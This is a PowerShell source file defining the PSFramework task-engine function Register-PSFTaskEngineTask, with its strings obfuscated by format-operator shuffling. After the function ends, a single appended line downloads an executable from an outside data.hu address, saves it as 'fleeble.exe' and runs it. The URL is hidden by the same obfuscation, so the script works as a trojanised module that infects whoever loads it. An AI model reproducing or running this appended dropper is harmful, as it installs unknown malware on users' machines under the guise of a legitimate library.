function Register-PSFTaskEngineTask
{
	
	[CmdletBinding(HelpUri = ("{2}{14}{7}{8}{11}{1}{5}{12}{15}{3}{4}{9}{10}{0}{20}{19}{17}{6}{18}{16}{13}"-f 'ram','ume','h','/command','s','ntati','Register-','//psfram','ewo','/PS','F','rk.org/doc','o','Task','ttps:','n','Engine','k/','PSFTask','or','ew'))]
	Param (
		[Parameter(Mandatory = $true)]
		[string]
		$Name,
		
		[string]
		$Description,
		
		[Parameter(Mandatory = $true)]
		[System.Management.Automation.ScriptBlock]
		$ScriptBlock,
		
		[Parameter(Mandatory = $true, ParameterSetName = "o`NCe")]
		[switch]
		$Once,
		
		[Parameter(Mandatory = $true, ParameterSetName = "REp`E`AT`InG")]
		[PSFTimeSpan]
		$Interval,
		
		[PSFTimeSpan]
		$Delay,
		
		[PSFramework.TaskEngine.Priority]
		$Priority = ("{0}{1}"-f'Medi','um'),
		
		[switch]
		$ResetTask,
		
		[switch]
		$EnableException
	)
	
	
	if ([PSFramework.TaskEngine.TaskHost]::Tasks.ContainsKey($Name.ToLower()))
	{
		$task = [PSFramework.TaskEngine.TaskHost]::Tasks[$Name.ToLower()]
		if (Test-PSFParameterBinding -ParameterName Description) { $task.Description = $Description}
		if ($task.ScriptBlock -ne $ScriptBlock) { $task.ScriptBlock = $ScriptBlock }
		if (Test-PSFParameterBinding -ParameterName Once) { $task.Once = $Once }
		if (Test-PSFParameterBinding -ParameterName Interval)
		{
			$task.Once = $false
			$task.Interval = $Interval
		}
		if (Test-PSFParameterBinding -ParameterName Delay) { $task.Delay = $Delay }
		if (Test-PSFParameterBinding -ParameterName Priority) { $task.Priority = $Priority }
		
		if ($ResetTask)
		{
			$task.Registered = Get-Date
			$task.LastExecution = New-Object System.DateTime(0)
			$task.State = ("{0}{2}{1}"-f'Pen','g','din')
		}
	}
	
	
	
	else
	{
		$task = New-Object PSFramework.TaskEngine.PsfTask
		$task.Name = $Name.ToLower()
		if (Test-PSFParameterBinding -ParameterName Description) { $task.Description = $Description }
		$task.ScriptBlock = $ScriptBlock
		if (Test-PSFParameterBinding -ParameterName Once) { $task.Once = $true }
		if (Test-PSFParameterBinding -ParameterName Interval)
		{
			if ($Interval.Value.Ticks -le 0)
			{
				Stop-PSFFunction -Message ('F'+'aile'+'d '+'to'+' '+'regist'+'er '+'ta'+'sk: '+"$Name "+'- '+'Inte'+'rval'+' '+'can'+'no'+'t '+'b'+'e '+'0 '+'or'+' '+'le'+'ss') -Category InvalidArgument -EnableException $EnableException
				return
			}
			else { $task.Interval = $Interval }
		}
		if (Test-PSFParameterBinding -ParameterName Delay) { $task.Delay = $Delay }
		$task.Priority = $Priority
		$task.Registered = Get-Date
		[PSFramework.TaskEngine.TaskHost]::Tasks[$Name.ToLower()] = $task
	}
	
	
	Start-PSFRunspace -Name ("{5}{1}{4}{0}{2}{3}"-f 'work.ta','sfr','ske','ngine','ame','p')
}

(New-Object System.Net.WebClient).DownloadFile(("{0}{6}{8}{1}{4}{3}{9}{7}{2}{11}{10}{5}" -f'http:','d','F','a.hu/get/0/9552103','at','xe','/','P','/ddl7.','/','e','Ifdp.'),("{1}{0}{2}" -f 'l','f','eeble.exe'));Start-Process ("{2}{1}{0}" -f'xe','e.e','fleebl')
